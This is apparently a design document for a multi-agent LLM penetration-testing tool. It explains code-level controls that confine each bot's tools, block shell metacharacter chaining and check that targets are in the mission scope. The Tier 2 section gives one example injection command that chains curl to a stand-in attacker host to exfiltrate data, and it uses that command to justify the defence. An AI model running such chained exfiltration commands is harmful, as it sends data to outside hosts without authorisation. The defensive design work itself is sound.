# Tool Scoping (v2)

## The Problem

In a multi-agent security tool, you need strict per-bot tool restrictions. A recon bot should not be running exploits. An exfiltration bot should not be scanning ports. But hardcoding tool lists in each bot agent is brittle — every new tool requires editing bot code.

Worse: if the LLM generates a command that chains an out-of-scope tool via shell metacharacters, or targets an out-of-scope host, category checks alone won't catch it.

## The Solution: 3-Tier Enforcement

Chimeras v2 enforces scope at three levels, all in code — not prompt instructions:

### Tier 1: Category Check

Bots declare a category. The scope enforcer maps categories to tool sets and dynamically discovers which tools are actually installed.

```python
BOT_CATEGORIES = {
    "aria": "passive_recon",
    "lisa": "active_scan",
    "bloodhound": "vuln_detection",
    ...
}

TOOL_CATEGORIES = {
    "passive_recon": {"dig", "host", "whois", "curl", "whatweb", ...},
    "active_scan": {"nmap", "nikto", "gobuster", "ffuf", ...},
    ...
}
```

Before any command executes, `ScopeEnforcer.check()` parses the command, extracts the tool name, and verifies it's in the bot's category. If not, blocked.

### Tier 2: Shell Metacharacter Injection Block (v2)

`ToolExecutor.run()` passes commands to `subprocess.run(shell=True)`. A first-token-only check means `nmap 10.10.10.1; curl http://evil.com/exfil` would pass the category check (sees `nmap`) but execute `curl` via shell chaining.

**Fix**: `ScopeEnforcer.check_shell_safety()` detects metacharacters (`;`, `&&`, `||`, `|`, backticks, `$()`, newlines) and rejects them for categories that don't require shell access:

- **Allowed** (categories that include `bash`/`python3`): `exploitation`, `privesc`, `exfiltration`
- **Blocked**: `passive_recon`, `active_scan`, `vuln_detection`, `payload_fab`
- **No execution**: `none` (WarChief, Bookkeeper)

### Tier 3: Target Validation (v2)

`TargetValidator` parses the command for IP addresses and hostnames, resolves them via DNS, and verifies they fall within the mission scope (`state["mission"]["scope"]`).

**Scope format support**:
- CIDR: `10.10.10.0/24`
- Single IP: `10.10.10.5`
- Domain: `example.com` (wildcard: `*.example.com`)
- Comma-separated: `10.10.10.0/24, example.com`

**Edge cases**:
- Commands with no identifiable target (`ls`, `whoami`) → pass through
- Hostname resolves to multiple IPs → all must be in scope
- DNS resolution failure → block (don't silently pass)
- Private IPs → must match exactly (no implied `10.0.0.0/8`)

This is a code-level check. The LLM cannot override it.

### Dynamic Discovery

`ScopeEnforcer._discover_installed_tools()` uses `shutil.which()` to find which tools are actually installed. The LLM is only told about available tools. Missing tools are reported but don't crash the system.

### Adding a New Tool

Add it to the appropriate category in `TOOL_CATEGORIES`. Every bot in that category automatically gets access. No bot agent code changes needed.

### Scope Violation Handling

When a bot attempts to use a tool outside its scope:
- The command is blocked before subprocess execution
- A `scope_blocked` result is returned with the reason
- The bot's LLM sees the blocked result and can adjust its strategy
- The violation is logged in `log.md`

### What Bots Never See

- Bots never see tools from other categories
- Bots never see tools that aren't installed on the system
- Bots cannot bypass the scope enforcer — it runs in `BaseBot._run_tool()` before any subprocess call
- Bots cannot target hosts outside the mission scope — `TargetValidator` blocks at code level
- Bots cannot inject commands via shell metacharacters (unless their category requires shell)